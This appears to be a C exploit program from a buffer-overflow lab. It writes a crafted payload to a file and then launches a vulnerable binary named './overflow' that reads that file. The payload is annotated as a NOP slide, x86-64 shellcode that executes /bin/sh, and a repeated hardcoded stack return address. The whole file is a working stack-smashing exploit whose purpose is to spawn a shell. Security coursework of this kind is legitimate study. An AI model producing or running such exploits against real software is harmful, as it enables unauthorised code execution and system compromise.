#include <sys/types.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/wait.h>


const char * filename = "attacker-controlled-file.txt";
const char * payload =
	
	// This is the size the buffer is gonna be overlowed by 

    "\x60\x00\x00\x00\x00\x00\x00\x00"                                   

    //8

    //This is the NOP slide 

	"\x90\x90\x90"		
	"\x90\x90\x90"			
	"\x90\x90\x90"			
	"\x90\x90\x90"			
	"\x90\x90\x90"			
	"\x90\x90\x90"			
	"\x90\x90\x90"			
	"\x90\x90\x90"
    "\x90\x90"          
		     			
    //26

    //This is the shell code 

    "\x48\x31\xd2"                                  // xor    %rdx, %rdx
    "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x53\x48"      // mov    $0x68732f6e69622f2f, %rbx
    "\x48\xc1\xeb\x08"                              // shr    $0x8, %rbx
    "\x53"                                          // push   %rbx
    "\x48\x89\xe7"                                  // mov    %rsp, %rdi
    "\x50"                                          // push   %rax
    "\x57"                                          // push   %rdi
    "\x48\x89\xe6"                                  // mov    %rsp, %rsi
    "\xb0\x3b"                                      // mov    $0x3b, %al
    "\x0f\x05"

    //30							   		
   
    //This is the return address we want 

    "\x38\xeb\xff\xff\xff\x7f\x00\x00"              //0x7fffffffeb30 + 0x08
    "\x38\xeb\xff\xff\xff\x7f\x00\x00"              //0x7fffffffeb30 + 0x08
    "\x38\xeb\xff\xff\xff\x7f\x00\x00"              //0x7fffffffeb30 + 0x08
    "\x38\xeb\xff\xff\xff\x7f\x00\x00"              //0x7fffffffeb30 + 0x08
    "\x38\xeb\xff\xff\xff\x7f\x00\x00";             //0x7fffffffeb30 + 0x08

    //40

    //total = 104 bytes
    
int main(int argc, char * argv[])
{
    FILE * fd = fopen(filename, "w");
    //if (fd == NULL) fopen failed, throw an error!
    /*size_t bytes_written = */fwrite(payload, 1, 104, fd);
    fclose(fd);

    pid_t pid = fork();
    if (pid == 0)
    {
        // this is the child process
        char * argv[] = { "./overflow", NULL };
        execv(argv[0], argv);
    }
    // else if (pid == -1) fork failed, throw an error!

    int status;
    wait(&status);
    //remove(filename);

    return 0;
}
